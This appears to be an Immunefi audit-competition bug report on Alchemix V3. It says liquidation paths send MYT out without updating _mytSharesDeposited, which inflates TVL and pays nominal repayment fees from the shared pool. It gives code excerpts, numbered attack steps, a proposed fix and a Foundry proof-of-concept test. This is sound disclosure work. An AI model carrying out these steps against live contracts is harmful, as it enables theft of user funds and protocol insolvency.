# 57360 sc critical unreconciled repayment fee transfer enables myt overpayment and tvl inflation

**Submitted on Oct 25th 2025 at 14:07:14 UTC by @riptide for** [**Audit Comp | Alchemix V3**](https://immunefi.com/audit-competition/alchemix-v3-audit-competition)

* **Report ID:** #57360
* **Report Type:** Smart Contract
* **Report severity:** Critical
* **Target:** <https://github.com/alchemix-finance/v3-poc/blob/immunefi\\_audit/src/AlchemistV3.sol>
* **Impacts:**
  * Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield
  * Protocol insolvency
  * Smart contract unable to operate due to lack of token funds

## Description

## Summary

The bug in `AlchemistV3._liquidate` involves an unreconciled repayment fee transfer that fails to update `_mytSharesDeposited`, causing MYT overpayment and inflating TVL during liquidations.

If exploited on mainnet, attackers could repeatedly extract MYT from the protocol's pool via nominal fees, draining user funds and potentially the entire TVL, leading to protocol insolvency. This would also cause operational failures (DoS of withdrawals/liquidations) due to insufficient token balances, despite inflated metrics, resulting in significant financial loss.

## Finding Description

`AlchemistV3._liquidate` forwards a nominal “repayment fee” in MYT without reconciling the actual collateral deducted and without updating `_mytSharesDeposited`, causing overpayment or reverts and inflating TVL. The broken lifecycle spans `._resolveRepaymentFee`, `._liquidate`, `._doLiquidation`, and `._forceRepay`.

The helper computes a nominal fee, clamps the per-account deduction, but returns the nominal value; it neither transfers tokens nor updates global counters.

```solidity
// src/AlchemistV3.sol
function _resolveRepaymentFee(uint256 accountId, uint256 repaidAmountInYield) internal returns (uint256 fee) {
    Account storage account = _accounts[accountId];
    fee = repaidAmountInYield * repaymentFee / BPS;                     // nominal fee
    account.collateralBalance -= fee > account.collateralBalance ?       // clamp deduction
        account.collateralBalance : fee;
    emit RepaymentFee(accountId, repaidAmountInYield, msg.sender, fee);  // emits nominal fee
    return fee;                                                          // returns nominal fee (not actual paid)
}
```

Repayment-only branches pay the nominal fee from the contract balance unconditionally and never decrement `_mytSharesDeposited`.

```solidity
// src/AlchemistV3.sol
if (account.debt == 0) {
    feeInYield = _resolveRepaymentFee(accountId, repaidAmountInYield);   // returns nominal fee
    TokenUtils.safeTransfer(myt, msg.sender, feeInYield);                // transfers nominal fee from pool
    return (repaidAmountInYield, feeInYield, 0);                         // no _mytSharesDeposited--
}
...
feeInYield = _resolveRepaymentFee(accountId, repaidAmountInYield);
TokenUtils.safeTransfer(myt, msg.sender, feeInYield);                    // same issue
```

Liquidation path also transfers MYT out without adjusting global shares.

```solidity
// src/AlchemistV3.sol
function _doLiquidation(...) internal returns (...) {
    ...
    TokenUtils.safeTransfer(myt, transmuter, amountLiquidated - feeInYield); // no _mytSharesDeposited--
    if (feeInYield > 0 && account.collateralBalance >= feeInYield) {
        TokenUtils.safeTransfer(myt, msg.sender, feeInYield);                // no _mytSharesDeposited--
    }
    ...
}
```

Forced repayment sends MYT to transmuter/protocol but does not decrement `_mytSharesDeposited`.

```solidity
// src/AlchemistV3.sol
if (account.collateralBalance > protocolFeeTotal) {
    account.collateralBalance -= protocolFeeTotal;
    TokenUtils.safeTransfer(myt, protocolFeeReceiver, protocolFeeTotal); // no _mytSharesDeposited--
}
if (creditToYield > 0) {
    TokenUtils.safeTransfer(myt, address(transmuter), creditToYield);    // no _mytSharesDeposited--
}
```

By contrast, non-liquidation flows correctly maintain `_mytSharesDeposited`.

```solidity
// src/AlchemistV3.sol
TokenUtils.safeTransfer(myt, recipient, amount);
_mytSharesDeposited -= amount;                 // withdraw()

TokenUtils.safeTransfer(myt, protocolFeeReceiver, ...);
_mytSharesDeposited -= ...;                    // repay()/burn()

TokenUtils.safeTransfer(myt, transmuter, collRedeemed);
TokenUtils.safeTransfer(myt, protocolFeeReceiver, feeCollateral);
_mytSharesDeposited -= collRedeemed + feeCollateral;  // redeem()
```

Inflated `_mytSharesDeposited` feeds TVL and liquidation math.

```solidity
// src/AlchemistV3.sol
function _getTotalUnderlyingValue() internal view returns (uint256) {
    uint256 yieldTokenTVLInUnderlying = convertYieldTokensToUnderlying(_mytSharesDeposited);
    return yieldTokenTVLInUnderlying;                                   // TVL uses inflated counter
}
...
normalizeUnderlyingTokensToDebt(_getTotalUnderlyingValue()) * FIXED_POINT_SCALAR / totalDebt
```

### Attack Steps

1. Pick `accountId` with `debt > 0`, `earmarked > 0`, and `collateral / debt <= collateralizationLowerBound`, while `AlchemistV3` holds sufficient MYT and `repaymentFee > 0`.
2. Call `AlchemistV3.liquidate(accountId)`.
3. `_earmark()` and `_sync(accountId)` update state (no transfers).
4. `_forceRepay(accountId, account.earmarked)` transfers `creditToYield` MYT to `transmuter` (and protocol fee to `protocolFeeReceiver`), reducing `account.collateralBalance` but not `_mytSharesDeposited`.
5. If `account.debt == 0` or the ratio is healthy, `_resolveRepaymentFee(accountId, creditToYield)` returns the nominal fee; `TokenUtils.safeTransfer(myt, msg.sender, fee)` pays this from pool even if per-account deduction was clamped to zero; `_mytSharesDeposited` unchanged.
6. Repeat across many accounts near the threshold to farm nominal fees and progressively inflate TVL (no global-share decrements on any liquidation-path outflows).

## Likelihood (high)

Any EOA can call `liquidate(uint256)`. Targets arise naturally: undercollateralized accounts with `earmarked > 0` frequently transition to repayment-only branches after `_forceRepay`. No capital is needed; profit per call equals `repaidAmountInYield * repaymentFee / BPS` even when the debtor’s collateral cannot fund it.

The protocol’s MYT pool covers the nominal fee transfer and liquidation/repayment transfers never decrement `_mytSharesDeposited`, inflating TVL. The exploit is low complexity (single call), race-agnostic, repeatable across many positions, and requires no external manipulation.

## Impact (critical)

**Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield:** Attackers can repeatedly extract MYT tokens by triggering liquidations that pay out nominal fees from the contract's pool, even when the targeted account's collateral can't cover it. This drains protocol-held funds that represent aggregated user collateral/yield, leading to permanent losses for the system and indirectly for users.

**Protocol insolvency:** Cumulative extraction could drain a large fraction of the protocol's MYT balance (up to the entire TVL in extreme cases), inflating TVL metrics while suppressing proper liquidations and causing solvency drift. If unchecked, this could render the protocol unable to repay loans or honor withdrawals, pushing it toward insolvency.

**Smart contract unable to operate due to lack of token funds:** The bug's MYT outflows without updating global counters (`_mytSharesDeposited`) create shortfalls, causing legitimate functions like liquidations, repayments, or withdrawals to revert due to insufficient balances, effectively DoSing core operations until the contract is drained or migrated.

## Mitigation

Return and use the actual paid fee and keep global shares in sync.

Specifically: modify `_resolveRepaymentFee` to compute `actualPaid = min(repaidAmountInYield * repaymentFee / BPS, account.collateralBalance)`, decrement `account.collateralBalance` by `actualPaid`, emit `actualPaid`, and return `actualPaid`.

In `_liquidate`, transfer exactly the returned `actualPaid` to `msg.sender` and decrement `_mytSharesDeposited` by `actualPaid` in both repayment-only branches. In `_doLiquidation`, after reducing `account.collateralBalance`, decrement `_mytSharesDeposited` by the total MYT sent out (to `transmuter` and liquidator).

In `_forceRepay`, decrement `_mytSharesDeposited` by `creditToYield` and `protocolFeeTotal` after transfers. Ensure all liquidation-path MYT outflows reduce `_mytSharesDeposited` and all events report actual amounts paid.

## Proof of Concept

## Proof of Concept

Add to `test/AlchemistV3.t.sol`

MYT outflows during liquidation (to the Transmuter) reduce the actual contract balance to 0, but `_mytSharesDeposited` remains unchanged, causing `getTotalUnderlyingValue()` to report an inflated TVL of `1e20`.

In the PoC, `repaymentFee=0`, so no explicit fee overpayment/extraction occurs (no transfer to the liquidator), but the underlying mechanic (transferring MYT without updating shares) enables theft in scenarios with positive fees: Liquidators could extract nominal fees from the protocol's pool even if the account's collateral can't cover them, draining user-aggregated funds.

The inflation itself indirectly enables theft by allowing more liquidations than should be possible (suppressed due to fake-healthy metrics), leading to further unauthorized outflows.

```

function test_poc_TVLInflatedAfterRepaymentLiquidation() external {
    // Set min collateralization to 1.0 so max borrow ~= full collateral (leftover ~ 0)
    vm.prank(alOwner);
    alchemist.setMinimumCollateralization(1e18);

    // Set repayment fee to 0 to isolate the TVL inflation due to missing _mytSharesDeposited decrements on repayment path
    vm.prank(alOwner);
    alchemist.setRepaymentFee(0);

    // User deposits MYT collateral
    uint256 deposit = 100e18;
    vm.startPrank(address(0xbeef));
    SafeERC20.safeApprove(address(vault), address(alchemist), deposit);
    alchemist.deposit(deposit, address(0xbeef), 0);
    uint256 tokenId = AlchemistNFTHelper.getFirstTokenId(address(0xbeef), address(alchemistNFT));

    // User mints the maximum possible debt (close to full deposit due to minCollateralization=1)
    uint256 maxBorrow = alchemist.getMaxBorrowable(tokenId);
    alchemist.mint(tokenId, maxBorrow, address(0xbeef));
    vm.stopPrank();

    // Fund a redeemer with synthetic tokens and create a full redemption to earmark the entire debt
    deal(address(alToken), anotherExternalUser, maxBorrow);
    vm.startPrank(anotherExternalUser);
    SafeERC20.safeApprove(address(alToken), address(transmuterLogic), maxBorrow);
    transmuterLogic.createRedemption(maxBorrow);
    vm.stopPrank();

    // Let the redemption fully mature (so earmarking is complete)
    vm.roll(block.number + 5_256_000);

    // Preconditions: account is under the lower bound and liquidation callable (only repayment expected)
    // Grab pre-state: TVL (uses _mytSharesDeposited) and actual MYT balance held by Alchemist
    uint256 tvlBeforeUnderlying = alchemist.getTotalUnderlyingValue();
    uint256 mytBalanceBefore = alchemist.getTotalDeposited(); // IERC20(myt).balanceOf(address(alchemist))

    // Liquidator calls liquidation — this will do a forceRepay (transfer MYT to transmuter) with no _mytSharesDeposited decrement
    vm.startPrank(externalUser);
    (uint256 yieldAmount, uint256 feeInYield, uint256 feeInUnderlying) = alchemist.liquidate(tokenId);
    vm.stopPrank();

    // Assert repayment-only branch: no yield fee nor underlying fee when repaymentFee=0
    assertEq(feeInYield, 0, "repayment path should not pay yield fee when repaymentFee=0");
    assertEq(feeInUnderlying, 0, "repayment path should not pay underlying fee when repaymentFee=0");
    assertGt(yieldAmount, 0, "repaid amount in yield should be > 0");

    // Post-state: actual MYT balance decreased by the repaid amount (no yield fees)
    uint256 mytBalanceAfter = alchemist.getTotalDeposited();
    assertEq(mytBalanceBefore - mytBalanceAfter, yieldAmount, "Alchemist MYT balance should drop by repaid yield");

    // CRITICAL: TVL is computed from _mytSharesDeposited which was NOT decremented on the repayment path
    // So, TVL remains unchanged even though MYT left the contract (inflated TVL)
    uint256 tvlAfterUnderlying = alchemist.getTotalUnderlyingValue();
    assertEq(tvlAfterUnderlying, tvlBeforeUnderlying, "TVL (underlying) stayed unchanged despite MYT outflow (inflation)");

    // Additionally, show the discrepancy: convert TVL (underlying) into yield units and compare to actual MYT balance
    uint256 tvlAfterInYield = alchemist.convertUnderlyingTokensToYield(tvlAfterUnderlying);
    assertGt(tvlAfterInYield, mytBalanceAfter, "TVL-derived yield exceeds actual MYT balance (proof of accounting mismatch)");
}
```
